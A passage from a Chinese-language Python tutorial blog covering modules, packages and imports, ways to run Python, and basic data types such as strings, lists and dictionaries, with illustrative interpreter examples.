<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python</span><br><span class="line">&gt;&gt;&gt; import using_name</span><br><span class="line">我来自另一模块</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>说明： 每个模块都有一个<strong>name</strong>属性，当其值是’<strong>main</strong>‘时，表明该模块自身在运行，否则是被引入。</p>
<p>说明：<strong>name</strong> 与 <strong>main</strong> 底下是双下划线， _ _ 是这样去掉中间的那个空格。</p>
<h3 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir() 函数"></a>dir() 函数</h3><p>内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> fibo, sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(fibo)</span><br><span class="line">[<span class="string">'__name__'</span>, <span class="string">'fib'</span>, <span class="string">'fib2'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(sys)  </span><br><span class="line">[<span class="string">'__displayhook__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__excepthook__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>,</span><br><span class="line"> <span class="string">'__package__'</span>, <span class="string">'__stderr__'</span>, <span class="string">'__stdin__'</span>, <span class="string">'__stdout__'</span>,</span><br><span class="line"> <span class="string">'_clear_type_cache'</span>, <span class="string">'_current_frames'</span>, <span class="string">'_debugmallocstats'</span>, <span class="string">'_getframe'</span>,</span><br><span class="line"> <span class="string">'_home'</span>, <span class="string">'_mercurial'</span>, <span class="string">'_xoptions'</span>, <span class="string">'abiflags'</span>, <span class="string">'api_version'</span>, <span class="string">'argv'</span>,</span><br><span class="line"> <span class="string">'base_exec_prefix'</span>, <span class="string">'base_prefix'</span>, <span class="string">'builtin_module_names'</span>, <span class="string">'byteorder'</span>,</span><br><span class="line"> <span class="string">'call_tracing'</span>, <span class="string">'callstats'</span>, <span class="string">'copyright'</span>, <span class="string">'displayhook'</span>,</span><br><span class="line"> <span class="string">'dont_write_bytecode'</span>, <span class="string">'exc_info'</span>, <span class="string">'excepthook'</span>, <span class="string">'exec_prefix'</span>,</span><br><span class="line"> <span class="string">'executable'</span>, <span class="string">'exit'</span>, <span class="string">'flags'</span>, <span class="string">'float_info'</span>, <span class="string">'float_repr_style'</span>,</span><br><span class="line"> <span class="string">'getcheckinterval'</span>, <span class="string">'getdefaultencoding'</span>, <span class="string">'getdlopenflags'</span>,</span><br><span class="line"> <span class="string">'getfilesystemencoding'</span>, <span class="string">'getobjects'</span>, <span class="string">'getprofile'</span>, <span class="string">'getrecursionlimit'</span>,</span><br><span class="line"> <span class="string">'getrefcount'</span>, <span class="string">'getsizeof'</span>, <span class="string">'getswitchinterval'</span>, <span class="string">'gettotalrefcount'</span>,</span><br><span class="line"> <span class="string">'gettrace'</span>, <span class="string">'hash_info'</span>, <span class="string">'hexversion'</span>, <span class="string">'implementation'</span>, <span class="string">'int_info'</span>,</span><br><span class="line"> <span class="string">'intern'</span>, <span class="string">'maxsize'</span>, <span class="string">'maxunicode'</span>, <span class="string">'meta_path'</span>, <span class="string">'modules'</span>, <span class="string">'path'</span>,</span><br><span class="line"> <span class="string">'path_hooks'</span>, <span class="string">'path_importer_cache'</span>, <span class="string">'platform'</span>, <span class="string">'prefix'</span>, <span class="string">'ps1'</span>,</span><br><span class="line"> <span class="string">'setcheckinterval'</span>, <span class="string">'setdlopenflags'</span>, <span class="string">'setprofile'</span>, <span class="string">'setrecursionlimit'</span>,</span><br><span class="line"> <span class="string">'setswitchinterval'</span>, <span class="string">'settrace'</span>, <span class="string">'stderr'</span>, <span class="string">'stdin'</span>, <span class="string">'stdout'</span>,</span><br><span class="line"> <span class="string">'thread_info'</span>, <span class="string">'version'</span>, <span class="string">'version_info'</span>, <span class="string">'warnoptions'</span>]</span><br></pre></td></tr></table></figure>
<p>如果没有给定参数，那么 dir() 函数会罗列出当前定义的所有名称:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> fibo</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fib = fibo.fib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir() <span class="comment"># 得到一个当前模块中定义的属性列表</span></span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__name__'</span>, <span class="string">'a'</span>, <span class="string">'fib'</span>, <span class="string">'fibo'</span>, <span class="string">'sys'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">5</span> <span class="comment"># 建立一个新的变量 'a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'a'</span>, <span class="string">'sys'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> a <span class="comment"># 删除变量名a</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir()</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__name__'</span>, <span class="string">'sys'</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="标准模块"><a href="#标准模块" class="headerlink" title="标准模块"></a>标准模块</h3><p>Python 本身带着一些标准的模块库，在 Python 库参考文档中将会介绍到（就是后面的”库参考文档”）。</p>
<p>有些模块直接被构建在解析器里，这些虽然不是一些语言内置的功能，但是他却能很高效的使用，甚至是系统级调用也没问题。</p>
<p>这些组件会根据不同的操作系统进行不同形式的配置，比如 winreg 这个模块就只会提供给 Windows 系统。</p>
<p>应该注意到这有一个特别的模块 sys ，它内置在每一个 Python 解析器中。变量 sys.ps1 和 sys.ps2 定义了主提示符和副提示符所对应的字符串:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.ps1</span><br><span class="line"><span class="string">'&gt;&gt;&gt; '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.ps2</span><br><span class="line"><span class="string">'... '</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.ps1 = <span class="string">'C&gt; '</span></span><br><span class="line">C&gt; print(<span class="string">'Yuck!'</span>)</span><br><span class="line">Yuck!</span><br><span class="line">C&gt;</span><br></pre></td></tr></table></figure>
<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>包是一种管理 Python 模块命名空间的形式，采用”点模块名称”。</p>
<p>比如一个模块的名称是 A.B， 那么他表示一个包 A中的子模块 B 。</p>
<p>就好像使用模块的时候，你不用担心不同模块之间的全局变量相互影响一样，采用点模块名称这种形式也不用担心不同库之间的模块重名的情况。</p>
<p>这样不同的作者都可以提供 NumPy 模块，或者是 Python 图形库。</p>
<p>不妨假设你想设计一套统一处理声音文件和数据的模块（或者称之为一个”包”）。</p>
<p>现存很多种不同的音频文件格式（基本上都是通过后缀名区分的，例如： .wav，:file:.aiff，:file:.au，），所以你需要有一组不断增加的模块，用来在不同的格式之间转换。</p>
<p>并且针对这些音频数据，还有很多不同的操作（比如混音，添加回声，增加均衡器功能，创建人造立体声效果），所以你还需要一组怎么也写不完的模块来处理这些操作。</p>
<p>这里给出了一种可能的包结构（在分层的文件系统中）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sound&#x2F;                          顶层包</span><br><span class="line">      __init__.py               初始化 sound 包</span><br><span class="line">      formats&#x2F;                  文件格式转换子包</span><br><span class="line">              __init__.py</span><br><span class="line">              wavread.py</span><br><span class="line">              wavwrite.py</span><br><span class="line">              aiffread.py</span><br><span class="line">              aiffwrite.py</span><br><span class="line">              auread.py</span><br><span class="line">              auwrite.py</span><br><span class="line">              ...</span><br><span class="line">      effects&#x2F;                  声音效果子包</span><br><span class="line">              __init__.py</span><br><span class="line">              echo.py</span><br><span class="line">              surround.py</span><br><span class="line">              reverse.py</span><br><span class="line">              ...</span><br><span class="line">      filters&#x2F;                  filters 子包</span><br><span class="line">              __init__.py</span><br><span class="line">              equalizer.py</span><br><span class="line">              vocoder.py</span><br><span class="line">              karaoke.py</span><br><span class="line">              ...</span><br></pre></td></tr></table></figure>
<p>在导入一个包的时候，Python 会根据 sys.path 中的目录来寻找这个包中包含的子目录。</p>
<p>目录只有包含一个叫做 <strong>init</strong>.py 的文件才会被认作是一个包，主要是为了避免一些滥俗的名字（比如叫做 string）不小心的影响搜索路径中的有效模块。</p>
<p>最简单的情况，放一个空的 :file:<strong>init</strong>.py就可以了。当然这个文件中也可以包含一些初始化代码或者为（将在后面介绍的） <strong>all</strong>变量赋值。</p>
<p>用户可以每次只导入一个包里面的特定模块，比如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sound.effects.echo</span><br></pre></td></tr></table></figure>
<p>这将会导入子模块:sound.effects.echo。 他必须使用全名去访问:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sound.effects.echo.echofilter(input, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>还有一种导入子模块的方法是:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sound.effects <span class="keyword">import</span> echo</span><br></pre></td></tr></table></figure>
<p>这同样会导入子模块: echo，并且他不需要那些冗长的前缀，所以他可以这样使用:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo.echofilter(input, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>还有一种变化就是直接导入一个函数或者变量:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sound.effects.echo <span class="keyword">import</span> echofilter</span><br></pre></td></tr></table></figure>
<p>同样的，这种方法会导入子模块: echo，并且可以直接使用他的 echofilter() 函数:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echofilter(input, output, delay=<span class="number">0.7</span>, atten=<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>注意当使用from package import item这种形式的时候，对应的item既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量。</p>
<p>import语法会首先把item当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，恭喜，一个:exc:ImportError 异常被抛出了。</p>
<p>反之，如果使用形如import item.subitem.subsubitem这种导入形式，除了最后一项，都必须是包，而最后一项则可以是模块或者是包，但是不可以是类，函数或者变量的名字。</p>
<h3 id="从一个包中导入"><a href="#从一个包中导入" class="headerlink" title="从一个包中导入*"></a>从一个包中导入*</h3><p>设想一下，如果我们使用 from sound.effects import *会发生什么？</p>
<p>Python 会进入文件系统，找到这个包里面所有的子模块，一个一个的把它们都导入进来。</p>
<p>但是很不幸，这个方法在 Windows平台上工作的就不是非常好，因为Windows是一个大小写不区分的系统。</p>
<p>在这类平台上，没有人敢担保一个叫做 ECHO.py 的文件导入为模块 echo 还是 Echo 甚至 ECHO。</p>
<p>（例如，Windows 95就很讨厌的把每一个文件的首字母大写显示）而且 DOS 的 8+3 命名规则对长模块名称的处理会把问题搞得更纠结。</p>
<p>为了解决这个问题，只能烦劳包作者提供一个精确的包的索引了。</p>
<p>导入语句遵循如下规则：如果包定义文件 <strong>init</strong>.py 存在一个叫做 <strong>all</strong> 的列表变量，那么在使用 from package import * 的时候就把这个列表中的所有名字作为包内容导入。</p>
<p>作为包的作者，可别忘了在更新包之后保证 <strong>all</strong> 也更新了啊。你说我就不这么做，我就不使用导入*这种用法，好吧，没问题，谁让你是老板呢。这里有一个例子，在:file:sounds/effects/<strong>init</strong>.py中包含如下代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__all__ = [<span class="string">"echo"</span>, <span class="string">"surround"</span>, <span class="string">"reverse"</span>]</span><br></pre></td></tr></table></figure>
<p>这表示当你使用from sound.effects import *这种用法时，你只会导入包里面这三个子模块。</p>
<p>如果 <strong>all</strong> 真的没有定义，那么使用from sound.effects import *这种语法的时候，就不会导入包 sound.effects 里的任何子模块。他只是把包sound.effects和它里面定义的所有内容导入进来（可能运行<strong>init</strong>.py里定义的初始化代码）。</p>
<p>这会把 <strong>init</strong>.py 里面定义的所有名字导入进来。并且他不会破坏掉我们在这句话之前导入的所有明确指定的模块。看下这部分代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sound.effects.echo</span><br><span class="line"><span class="keyword">import</span> sound.effects.surround</span><br><span class="line"><span class="keyword">from</span> sound.effects <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>
<p>这个例子中，在执行from…import前，包sound.effects中的echo和surround模块都被导入到当前的命名空间中了。（当然如果定义了<strong>all</strong>就更没问题了）</p>
<p>通常我们并不主张使用*这种方法来导入模块，因为这种方法经常会导致代码的可读性降低。不过这样倒的确是可以省去不少敲键的功夫，而且一些模块都设计成了只能通过特定的方法导入。</p>
<p>记住，使用from Package import specific_submodule这种方法永远不会有错。事实上，这也是推荐的方法。除非是你要导入的子模块有可能和其他包的子模块重名。</p>
<p>如果在结构中包是一个子包（比如这个例子中对于包sound来说），而你又想导入兄弟包（同级别的包）你就得使用导入绝对的路径来导入。比如，如果模块sound.filters.vocoder 要使用包sound.effects中的模块echo，你就要写成 from sound.effects import echo。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> echo</span><br><span class="line"><span class="keyword">from</span> .. <span class="keyword">import</span> formats</span><br><span class="line"><span class="keyword">from</span> ..filters <span class="keyword">import</span> equalizer</span><br></pre></td></tr></table></figure>
<p>无论是隐式的还是显式的相对导入都是从当前模块开始的。主模块的名字永远是”<strong>main</strong>“，一个Python应用程序的主模块，应当总是使用绝对路径引用。</p>
<p>包还提供一个额外的属性<strong>path</strong>。这是一个目录列表，里面每一个包含的目录都有为这个包服务的<strong>init</strong>.py，你得在其他<strong>init</strong>.py被执行前定义哦。可以修改这个变量，用来影响包含在包里面的模块和子包。</p>
<p>这个功能并不常用，一般用来扩展包里面的模块。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>本章主要参考以下文章教程<br><a href="http://www.runoob.com/python3/python3-conditional-statements.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-conditional-statements.html</a><br><a href="http://www.runoob.com/python3/python3-conditional-statements.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-conditional-statements.html</a><br><a href="http://www.runoob.com/python3/python3-iterator-generator.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-iterator-generator.html</a><br><a href="http://www.runoob.com/python3/python3-function.html" target="_blank" rel="noopener">http://www.runoob.com/python3/python3-function.html</a></p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python3 语法</tag>
      </tags>
  </entry>
  <entry>
    <title>运行python</title>
    <url>/2018/01/10/python/python101/python-2-%E8%BF%90%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="运行python"><a href="#运行python" class="headerlink" title="运行python"></a>运行python</h2><p>有三种运行python的方式。最简单的方式是交互式的启动解释器，每次输入一行python代码来执行。另外一种启动Python的方式就是运行python脚本。这样会调用相关的脚本解释器。最后一种方法就是用集成开发环境中的图形界面运行python。</p>
<h3 id="交互式的启动解释器"><a href="#交互式的启动解释器" class="headerlink" title="交互式的启动解释器"></a>交互式的启动解释器</h3><p>在命令行上启动解释器，就可以马上编写Python代码了</p>
<p><img src="https://huhansi.github.io/images/180129-start-cmd.png" alt="打开cmd窗口"></p>
<h3 id="打开控制台窗口"><a href="#打开控制台窗口" class="headerlink" title="打开控制台窗口"></a>打开控制台窗口</h3><p><img src="https://huhansi.github.io/images/180129-cmd-started.png" alt="cmd窗口"></p>
<p>进入python运行环境</p>
<p><img src="https://huhansi.github.io/images/180129-start-python.png" alt="进入运行环境"></p>
<p>现在就可以在<strong>&gt;&gt;&gt;</strong>提示符后输入python语句了， 例如：</p>
<p><img src="https://huhansi.github.io/images/180129-python-code-example.png" alt="输入python语句"></p>
<h3 id="运行python脚本"><a href="#运行python脚本" class="headerlink" title="运行python脚本"></a>运行python脚本</h3><p>这个步骤其实就是把刚才的语句保存到<strong>.py</strong>结尾的文件中，然后执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python code.py</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/180129-python-script-example.png" alt="执行python脚本"></p>
<h3 id="使用集成开发环境"><a href="#使用集成开发环境" class="headerlink" title="使用集成开发环境"></a>使用集成开发环境</h3><p>集成开发环境，又称之为IDE是一种集成了调试器、文本编辑器而且支持各种像CSV这样的源代码版本控制工具。</p>
<p>一般常见的有IDLE、PythonWin、Pycharm（推荐）</p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python基本类型</title>
    <url>/2018/01/10/python/python101/python-3-%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p>Python提供的基本数据类型主要有：空类型、布尔类型、整型、浮点型、字符串、列表、元组、集合、字典。</p>
<h2 id="整型（Int）"><a href="#整型（Int）" class="headerlink" title="整型（Int）"></a>整型（Int）</h2><p>整型，一般就是表示整数。在Python中，没有特别区分长整型和整型。一般超过32位之后，就自动当做长整型来处理。长整型在python中几乎没有范围限制。  </p>
<p><img src="https://huhansi.github.io/images/2%E7%9A%8410000%E6%AC%A1%E6%96%B9.PNG" alt="2的10000次方"></p>
<h2 id="浮点数（Float）"><a href="#浮点数（Float）" class="headerlink" title="浮点数（Float）"></a>浮点数（Float）</h2><p>也就是C语言中的double，java中的float和double。在运算中，整数和浮点数的运算结果也是浮点数。  </p>
<p><img src="https://huhansi.github.io/images/3%E9%99%A4%E4%BB%A52.PNG" alt="整数和浮点数运算"></p>
<p>注： <code>//</code> 表示对结果取整，直接舍弃小数点后面的数值。  </p>
<p><img src="https://huhansi.github.io/images/%E5%8F%96%E6%95%B4.PNG" alt="除法取整"></p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>在python中，被单引号<code>&#39;</code>或者双引号<code>&quot;</code>或者三引号<code>&quot;&quot;&quot;</code>包围起来的字符序列即为字符串。和其他语言一样，使用<code>\</code>进行转义。</p>
<p><img src="https://huhansi.github.io/images/%E5%AD%97%E7%AC%A6%E4%B8%B2.PNG" alt="字符串"></p>
<p>在python中可以使用<code>r</code>或者<code>u</code>来修饰字符串。<br>使用<code>r/R</code>修饰表示后面跟着的就是普通字符串。即，如果字符串中包含<code>\n</code>那么它也就是一个反斜杠字符和一个字母n，而不是表示换行符。</p>
<p><img src="https://huhansi.github.io/images/r%E5%AD%97%E7%AC%A6.PNG" alt="r修饰效果"><br>使用<code>u/U</code>修饰字符串表示unicode字符串。Unicode是书写国际文本的标准方法。如果你想要用非英语写文本,那么你需要有一个支持Unicode的编辑器。<br>类似地,Python允许你处理Unicode文本——你只需要在字符串前加上前缀u或U。</p>
<h3 id="字符串运算"><a href="#字符串运算" class="headerlink" title="字符串运算"></a>字符串运算</h3><p>使用<code>+</code>号拼接字符串</p>
<p><img src="https://huhansi.github.io/images/+%E5%8F%B7%E6%8B%BC%E6%8E%A5.PNG" alt="+号拼接"></p>
<p>乘法运算</p>
<p><img src="https://huhansi.github.io/images/%E4%B9%98%E6%B3%95%E8%BF%90%E7%AE%97.PNG" alt="乘法运算"><br>自动拼接</p>
<p><img src="https://huhansi.github.io/images/%E7%A9%BA%E6%A0%BC%E5%88%86%E5%89%B2.PNG" alt="自动拼接空格分割的字符串"><br>使用<code>len()</code>方法求字符串长度</p>
<p><img src="https://huhansi.github.io/images/%E6%B1%82%E9%95%BF%E5%BA%A6.PNG" alt="求对应字符串的长度"></p>
<p>取字符串对应下标的字符<br>同其他语言一样，字符串的索引是从0开始，到str.length - 1为止，超过就越界。</p>
<p><img src="https://huhansi.github.io/images/%E4%B8%8B%E6%A0%87%E5%8F%96%E5%80%BC%E5%92%8C%E8%B6%8A%E7%95%8C.PNG" alt="下标取值"><br>其他字符串用法可参见<a href="python-string-functions">python字符串内建函数</a></p>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>列表是python的基本数据结构之一，也是最常用的数据结构。和CPP、Java等语言不同，python的列表数据项不需要具有相同的类型。列表中的每个元素都分配一个数字-它的位置，或者索引，第一个索引是0，第二个索引是1，依次类推。</p>
<h3 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h3><p><code>foods = []    #创建空列表</code><br><code>foods = [1, 2, 3, 4, 5]    # 创建整型列表</code><br><code>foods = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;]  # 创建字符型列表</code><br><code>foods = [1, 2, 3, &#39;d&#39;, 1.2]    # 创建混合列表</code></p>
<p>还可以使用列表生成式来生成列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; [x * x for x in range(5)]</span><br><span class="line">foods &#x3D; [x ** x for x in range(10) if x % 2 &#x3D;&#x3D; 0]</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%97%E8%A1%A8%E7%94%9F%E6%88%90%E5%BC%8F%E7%94%9F%E6%88%90%E5%88%97%E8%A1%A8.PNG" alt="列表生成式示例"></p>
<h3 id="访问列表"><a href="#访问列表" class="headerlink" title="访问列表"></a>访问列表</h3><p>使用for…in…迭代列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; [1, 2, 3, 4, 5]</span><br><span class="line">for food in foods:</span><br><span class="line">    print(food)</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E8%BF%AD%E4%BB%A3%E5%88%97%E8%A1%A8.PNG" alt="使用for...in...迭代列表"><br>使用索引取列表指定位置元素</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; [1, 2, 3, 4, 5]</span><br><span class="line">print(foods[0])</span><br><span class="line">print(foods[5])</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E7%B4%A2%E5%BC%95%E5%8F%96%E5%80%BC.PNG" alt="索引从0开始，到list.length - 1 结束"></p>
<h3 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h3><p>可以对列表的数据项进行修改或者更新，也可以对列表进行增删。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; []    # 生成一个空列表</span><br><span class="line">foods.append(1)    # 向列表追加 1</span><br><span class="line">foods.append(2)    # 向列表追加 2</span><br><span class="line">foods[1] &#x3D; 3    # 将列表第二个元素值修改为 3</span><br><span class="line">fruits &#x3D; []    # 生成另一个空列表</span><br><span class="line">fruits.extend(food)    # 用foods列表来扩展fruits列表</span><br><span class="line">fruits.append(&#39;apple&#39;)    # 在fruits列表末追加 apple 项</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.PNG" alt="列表的增加，修改操作"></p>
<h3 id="删除列表"><a href="#删除列表" class="headerlink" title="删除列表"></a>删除列表</h3><p>使用<code>del</code>关键字删除列表元素</p>
<p><img src="https://huhansi.github.io/images/%E5%88%A0%E9%99%A4%E5%88%97%E8%A1%A8%E5%85%83%E7%B4%A0.PNG" alt="使用del删除列表元素"></p>
<h3 id="列表分片"><a href="#列表分片" class="headerlink" title="列表分片"></a>列表分片</h3><p>python中使用索引来取列表中特定位置的值。分片操作就是用来取一定范围内的值，它通过在方括号内用冒号隔开两个索引来实现，第一个索引是开始点，包括在结果之中，第二个索引的元素是结束点，不包括在结果之中。即，它取的是一个前闭后开的区间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string &#x3D; &#39;www.python.org&#39;    # 字符串也是一个列表</span><br><span class="line">string[4:10]    #取列表索引为4，到索引为10的，前闭后开区间中的字符串</span><br><span class="line">string[4:-4]    # 取列表索引为4，到从后往前第4个区间中的字符串</span><br><span class="line">string[:-1]    # 取索引为0，到最后一个字符为止，区间中的字符串</span><br><span class="line">string[::-1]    # -1 表示步长，即从末尾到首部，依次输出字符</span><br><span class="line">string[-1]    # 取最后一个字符</span><br><span class="line">string[-3]    # 取最后第3个字符</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%97%E8%A1%A8%E5%88%86%E7%89%87.PNG" alt="列表分片"><br>分片可以接受3个参数l[x:y:z]，其中x表示起始索引，如果留空，默认为列表的头部，同理，y留空，默认为列表的尾部，z表示步长，默认为1。</p>
<p><img src="https://huhansi.github.io/images/%E5%88%86%E7%89%87%E5%8F%82%E6%95%B0.PNG" alt="分片参数"></p>
<h3 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foods &#x3D; [x for x in range(5)]    # 生成一个列表，[1, 2, 3, 4, 5]</span><br><span class="line">print(len(foods))    # 计算列表长度</span><br><span class="line">[1, 2, 3] + [4, 5]    # 拼接两个列表</span><br><span class="line">[1] * 5    # 复制列表元素</span><br><span class="line">3 in [1] * 5    # false 3 是否在列表 [1] * 5 中</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C.PNG" alt="其他操作"></p>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>字典是另一种可变容器模型，且可存储任意类型对象。</p>
<p>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中 ,格式如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;key1 : value1, key2 : value2 &#125;</span><br></pre></td></tr></table></figure>
<p>键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;    # 生成空字典</span><br><span class="line">d</span><br><span class="line">d &#x3D; &#123;&#39;a&#39;: 1, &#39;b&#39;: 2, &#39;b&#39;: &#39;3&#39;&#125;</span><br><span class="line">d[&#39;b&#39;]    # 从字典取键为b的值</span><br><span class="line">d</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8.PNG" alt="生成字典"><br>值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组。</p>
<p>一个简单的字典实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict &#x3D; &#123;&#39;Alice&#39;: &#39;2341&#39;, &#39;Beth&#39;: &#39;9102&#39;, &#39;Cecil&#39;: &#39;3258&#39;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B82.PNG" alt="生成字典"><br>也可如此创建字典：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dict1 &#x3D; &#123; &#39;abc&#39;: 456 &#125;</span><br><span class="line">dict2 &#x3D; &#123; &#39;abc&#39;: 123, 98.6: 37 &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E4%B8%8D%E5%8F%AF%E5%8F%98%E9%94%AE.PNG" alt="不可变键"></p>
<h3 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h3><p>字典可以使用任意不变的对象作为键值，字符串、整型、元组等。列表是不可作为键值的，因为它是可变对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&#39;name&#39;] &#x3D; &#39;huhansan&#39;</span><br><span class="line">d[&#39;huhansan&#39;] &#x3D; &quot;name&quot; </span><br><span class="line">d[(1, 2, 3)] &#x3D; &#39;tuple&#39;    # 使用元组做键值</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/%E5%88%97%E8%A1%A8%E6%B7%BB%E5%8A%A0%E5%85%83%E7%B4%A0.PNG" alt="列表添加元素"></p>
<h3 id="访问和遍历元素"><a href="#访问和遍历元素" class="headerlink" title="访问和遍历元素"></a>访问和遍历元素</h3><p>可以直接使用键值key取字典中对应的值，也可以只用dict.keys()和dict.item()来遍历获取字典中所有键值对。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d &#x3D; &#123;&#125;</span><br><span class="line">d[&#39;name&#39;] &#x3D; &#39;huhansan&#39;</span><br><span class="line">d[&#39;huhansan&#39;] &#x3D; &quot;name&quot; </span><br><span class="line">d[(1, 2, 3)] &#x3D; &#39;tuple&#39;</span><br><span class="line">print(d[&#39;name&#39;])</span><br><span class="line">for key in d.keys():    # 调用keys 遍历字典</span><br><span class="line">    print(d[key])</span><br><span class="line"></span><br><span class="line">for key, value in d.items():    # 调用items 获取键值对</span><br><span class="line">	print(key, value)</span><br></pre></td></tr></table></figure>
